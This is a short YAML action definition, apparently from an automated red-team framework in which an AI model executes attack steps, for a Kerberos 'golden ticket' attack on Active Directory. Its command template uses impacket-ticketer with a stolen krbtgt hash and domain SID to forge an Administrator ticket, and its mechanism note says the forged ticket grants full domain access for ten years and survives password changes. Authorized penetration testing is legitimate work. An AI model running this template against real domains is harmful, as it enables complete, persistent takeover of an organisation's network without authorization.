name: golden_ticket
category: ad
description: Forge golden ticket with krbtgt hash
preconditions:
  - domain_joined
parameters:
  target_ip: from_engagement.target_ip
command_template: "impacket-ticketer -nthash '{krbtgt_hash}' -domain-sid '{sid}' -domain {domain} Administrator"
parser: null
expected_effects:
  - action_completed
falsifier:
  pattern: "error|failed|refused|denied"
  timeout: 30
model_tier: haiku
mechanism: "Golden ticket: forged TGT using krbtgt hash. Full domain access for 10 years (default). Survives password changes except krbtgt reset (twice)."
